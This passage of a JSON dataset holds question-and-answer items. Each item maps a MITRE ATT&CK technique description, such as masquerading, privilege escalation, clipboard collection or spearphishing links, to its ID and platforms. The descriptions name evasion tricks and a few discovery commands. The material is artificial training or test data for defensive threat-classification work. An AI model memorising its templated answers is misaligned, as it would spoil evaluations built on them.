      "question": "Which platforms are related to the following technique description: Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation. This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe). In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster. Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous.\n\nAdversaries may also use the same icon of the file they are trying to mimic.",
      "answer": "The provided description is related to MITRE technique Masquerading: Match Legitimate Name or Location (T1036.005);\nTechnique Masquerading: Match Legitimate Name or Location (T1036.005) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.?",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
    "context": "",
    "output": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nMany command shell utilities can be used to obtain this information. Examples include <code>dir</code>, <code>tree</code>, <code>ls</code>, <code>find</code>, and <code>locate</code>. Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. <code>dir</code>, <code>show flash</code>, and/or <code>nvram</code>).\n\nSome files and directories may require elevated or specific user permissions to access.",
      "answer": "The provided description is related to MITRE technique File and Directory Discovery (T1083);\nTechnique File and Directory Discovery (T1083) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",
    "context": "",
    "output": "The provided description is related to MITRE technique Exploitation for Privilege Escalation (T1068);\nTechnique Exploitation for Privilege Escalation (T1068) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",
      "answer": "The provided description is related to MITRE technique Exploitation for Privilege Escalation (T1068);\nTechnique Exploitation for Privilege Escalation (T1068) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
    "context": "",
    "output": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may use Obfuscated Files or Information to hide artifacts of an intrusion from analysis. They may require separate mechanisms to decode or deobfuscate that information depending on how they intend to use it. Methods for doing that include built-in functionality of malware or by using utilities present on the system.\n\nOne such example is the use of certutil to decode a remote access tool portable executable file that has been hidden inside a certificate file. Another example is using the Windows <code>copy /b</code> command to reassemble binary fragments into a malicious payload.\n\nSometimes a user's action may be required to open it for deobfuscation or decryption as part of User Execution. The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.",
      "answer": "The provided description is related to MITRE technique Deobfuscate/Decode Files or Information (T1140);\nTechnique Deobfuscate/Decode Files or Information (T1140) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.?",
    "context": "",
    "output": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may attempt to identify the primary user, currently logged in user, set of users that commonly uses a system, or whether a user is actively using the system. They may do this, for example, by retrieving account usernames or by using OS Credential Dumping. The information may be collected in a number of different ways using other Discovery techniques, because user and username details are prevalent throughout a system and include running process ownership, file/directory ownership, session information, and system logs. Adversaries may use the information from System Owner/User Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nVarious utilities and commands may acquire this information, including <code>whoami</code>. In macOS and Linux, the currently logged in user can be identified with <code>w</code> and <code>who</code>. On macOS the <code>dscl . list /Users | grep -v '_'</code> command can also be used to enumerate user accounts. Environment variables, such as <code>%USERNAME%</code> and <code>$USER</code>, may also be used to access this information.\n\nOn network devices, Network Device CLI commands such as `show users` and `show ssh` can be used to display users currently logged into the device.",
      "answer": "The provided description is related to MITRE technique System Owner/User Discovery (T1033);\nTechnique System Owner/User Discovery (T1033) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Exploitation for Privilege Escalation (T1068);\nTechnique Exploitation for Privilege Escalation (T1068) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may exploit software vulnerabilities in an attempt to elevate privileges. Exploitation of a software vulnerability occurs when an adversary takes advantage of a programming error in a program, service, or within the operating system software or kernel itself to execute adversary-controlled code. Security constructs such as permission levels will often hinder access to information and use of certain techniques, so adversaries will likely need to perform privilege escalation to include use of software exploitation to circumvent those restrictions.\n\nWhen initially gaining access to a system, an adversary may be operating within a lower privileged process which will prevent them from accessing certain resources on the system. Vulnerabilities may exist, usually in operating system components and software commonly running at higher permissions, that can be exploited to gain higher levels of access on the system. This could enable someone to move from unprivileged or user level permissions to SYSTEM or root permissions depending on the component that is vulnerable. This could also enable an adversary to move from a virtualized environment, such as within a virtual machine or container, onto the underlying host. This may be a necessary step for an adversary compromising an endpoint system that has been properly configured and limits other privilege escalation methods.\n\nAdversaries may bring a signed vulnerable driver onto a compromised machine so that they can exploit the vulnerability to execute code in kernel mode. This process is sometimes referred to as Bring Your Own Vulnerable Driver (BYOVD). Adversaries may include the vulnerable driver with files delivered during Initial Access or download it to a compromised system via Ingress Tool Transfer or Lateral Tool Transfer.",
      "answer": "The provided description is related to MITRE technique Exploitation for Privilege Escalation (T1068);\nTechnique Exploitation for Privilege Escalation (T1068) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
    "context": "",
    "output": "The provided description is related to MITRE technique Non-Application Layer Protocol (T1095);\nTechnique Non-Application Layer Protocol (T1095) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may use an OSI non-application layer protocol for communication between host and C2 server or among infected hosts within a network. The list of possible protocols is extensive. Specific examples include use of network layer protocols, such as the Internet Control Message Protocol (ICMP), transport layer protocols, such as the User Datagram Protocol (UDP), session layer protocols, such as Socket Secure (SOCKS), as well as redirected/tunneled protocols, such as Serial over LAN (SOL).\n\nICMP communication between hosts is one example. Because ICMP is part of the Internet Protocol Suite, it is required to be implemented by all IP-compatible hosts. However, it is not as commonly monitored as other Internet Protocols such as TCP or UDP and may be used by adversaries to hide communications.",
      "answer": "The provided description is related to MITRE technique Non-Application Layer Protocol (T1095);\nTechnique Non-Application Layer Protocol (T1095) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
    "context": "",
    "output": "The provided description is related to MITRE technique Automated Exfiltration (T1020);\nTechnique Automated Exfiltration (T1020) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as Exfiltration Over C2 Channel and Exfiltration Over Alternative Protocol.",
      "answer": "The provided description is related to MITRE technique Automated Exfiltration (T1020);\nTechnique Automated Exfiltration (T1020) is applicable to platforms: Network,  Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Network,  Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name   . Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
    "context": "",
    "output": "The provided description is related to MITRE technique Hide Artifacts: Hidden Files and Directories (T1564.001);\nTechnique Hide Artifacts: Hidden Files and Directories (T1564.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may set files and directories to be hidden to evade detection mechanisms. To prevent normal users from accidentally changing special files on a system, most operating systems have the concept of a \u2018hidden\u2019 file. These files don\u2019t show up when a user browses the file system with a GUI or when using normal commands on the command line. Users must explicitly ask to show the hidden files either via a series of Graphical User Interface (GUI) prompts or with command line switches (<code>dir /a</code> for Windows and <code>ls \u2013a</code> for Linux and macOS).\n\nOn Linux and Mac, users can mark specific files as hidden simply by putting a \u201c.\u201d as the first character in the file or folder name   . Files and folders that start with a period, \u2018.\u2019, are by default hidden from being viewed in the Finder application and standard command-line utilities like \u201cls\u201d. Users must specifically change settings to have these files viewable.\n\nFiles on macOS can also be marked with the UF_HIDDEN flag which prevents them from being seen in Finder.app, but still allows them to be seen in Terminal.app . On Windows, users can mark specific files as hidden by using the attrib.exe binary. Many applications create these hidden files and folders to store information so that it doesn\u2019t clutter up the user\u2019s workspace. For example, SSH utilities create a .ssh folder that\u2019s hidden and contains the user\u2019s known hosts and keys.\n\nAdversaries can use this to their advantage to hide files and folders anywhere on the system and evading a typical user or system analysis that does not incorporate investigation of hidden files.",
      "answer": "The provided description is related to MITRE technique Hide Artifacts: Hidden Files and Directories (T1564.001);\nTechnique Hide Artifacts: Hidden Files and Directories (T1564.001) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.\n\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.?",
    "context": "",
    "output": "The provided description is related to MITRE technique External Remote Services (T1133);\nTechnique External Remote Services (T1133) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may leverage external-facing remote services to initially access and/or persist within a network. Remote services such as VPNs, Citrix, and other access mechanisms allow users to connect to internal enterprise network resources from external locations. There are often remote service gateways that manage connections and credential authentication for these services. Services such as Windows Remote Management and VNC can also be used externally.\n\nAccess to Valid Accounts to use the service is often a requirement, which could be obtained through credential pharming or by obtaining the credentials from users after compromising the enterprise network. Access to remote services may be used as a redundant or persistent access mechanism during an operation.\n\nAccess may also be gained through an exposed service that doesn\u2019t require authentication. In containerized environments, this may include an exposed Docker API, Kubernetes API server, kubelet, or web application such as the Kubernetes dashboard.",
      "answer": "The provided description is related to MITRE technique External Remote Services (T1133);\nTechnique External Remote Services (T1133) is applicable to platforms: Linux,  Windows,  macOS, Containers;\nTherefore, the given procedure description is related to platforms: Linux,  Windows,  macOS, Containers.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "Which platforms are related to the following technique description: Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., Transmitted Data Manipulation).\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.?",
    "context": "",
    "output": "The provided description is related to MITRE technique Clipboard Data (T1115);\nTechnique Clipboard Data (T1115) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "Which platforms are related to the following technique description: Adversaries may collect data stored in the clipboard from users copying information within or between applications. \n\nFor example, on Windows adversaries can access clipboard data by using <code>clip.exe</code> or <code>Get-Clipboard</code>. Additionally, adversaries may monitor then replace users\u2019 clipboard with their data (e.g., Transmitted Data Manipulation).\n\nmacOS and Linux also have commands, such as <code>pbpaste</code>, to grab clipboard contents.",
      "answer": "The provided description is related to MITRE technique Clipboard Data (T1115);\nTechnique Clipboard Data (T1115) is applicable to platforms: Windows,  macOS, Linux;\nTherefore, the given procedure description is related to platforms: Windows,  macOS, Linux.",
      "category": [
        "MITREFlan"
      ],
      "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform"
    }
  },
  {
    "instruction": "What are the platforms that are related to the following technique description: Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.  These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. \n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., Steal Web Session Cookie) in addition to their username and password. This may enable the adversary to then bypass MFA via Web Session Cookie.\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page. By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans. These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., Phishing), which may be less secure in several relevant ways. For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.",
    "context": "",
    "output": "The provided description is related to MITRE technique Phishing for Information: Spearphishing Link (T1598.003);\nTechnique Phishing for Information: Spearphishing Link (T1598.003) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
    "category": "MitreFlan",
    "instruction_type": "cot_technique_platform_mapping_CoT_procedure_platform",
    "parsed_raw_data": {
      "question": "What are the platforms that are related to the following technique description: Adversaries may send spearphishing messages with a malicious link to elicit sensitive information that can be used during targeting. Spearphishing for information is an attempt to trick targets into divulging information, frequently credentials or other actionable information. Spearphishing for information frequently involves social engineering techniques, such as posing as a source with a reason to collect information (ex: Establish Accounts or Compromise Accounts) and/or sending multiple, seemingly urgent messages.\n\nAll forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, the malicious emails contain links generally accompanied by social engineering text to coax the user to actively click or copy and paste a URL into a browser. The given website may be a clone of a legitimate site (such as an online or corporate login portal) or may closely resemble a legitimate site in appearance and have a URL containing elements from the real site. URLs may also be obfuscated by taking advantage of quirks in the URL schema, such as the acceptance of integer- or hexadecimal-based hostname formats and the automatic discarding of text before an \u201c@\u201d symbol: for example, `hxxp://google.com@1157586937`.\n\nAdversaries may also embed \u201ctracking pixels\u201d, \"web bugs\", or \"web beacons\" within phishing messages to verify the receipt of an email, while also potentially profiling and tracking victim information such as IP address.  These mechanisms often appear as small images (typically one pixel in size) or otherwise obfuscated objects and are typically delivered as HTML code containing a link to a remote server. \n\nAdversaries may also be able to spoof a complete website using what is known as a \"browser-in-the-browser\" (BitB) attack. By generating a fake browser popup window with an HTML-based address bar that appears to contain a legitimate URL (such as an authentication portal), they may be able to prompt users to enter their credentials while bypassing typical URL verification methods.\n\nAdversaries can use phishing kits such as `EvilProxy` and `Evilginx2` to perform adversary-in-the-middle phishing by proxying the connection between the victim and the legitimate website. On a successful login, the victim is redirected to the legitimate website, while the adversary captures their session cookie (i.e., Steal Web Session Cookie) in addition to their username and password. This may enable the adversary to then bypass MFA via Web Session Cookie.\n\nAdversaries may also send a malicious link in the form of Quick Response (QR) Codes (also known as \u201cquishing\u201d). These links may direct a victim to a credential phishing page. By using a QR code, the URL may not be exposed in the email and may thus go undetected by most automated email security scans. These QR codes may be scanned by or delivered directly  to a user\u2019s mobile device (i.e., Phishing), which may be less secure in several relevant ways. For example, mobile users may not be able to notice minor differences between genuine and credential harvesting websites due to mobile\u2019s smaller form factor.\n\nFrom the fake website, information is gathered in web forms and sent to the adversary. Adversaries may also use information from previous reconnaissance efforts (ex: Search Open Websites/Domains or Search Victim-Owned Websites) to craft persuasive and believable lures.",
      "answer": "The provided description is related to MITRE technique Phishing for Information: Spearphishing Link (T1598.003);\nTechnique Phishing for Information: Spearphishing Link (T1598.003) is applicable to platforms: PRE;\nTherefore, the given procedure description is related to platforms: PRE.",
      "category": [
        "MITREFlan"
      ],
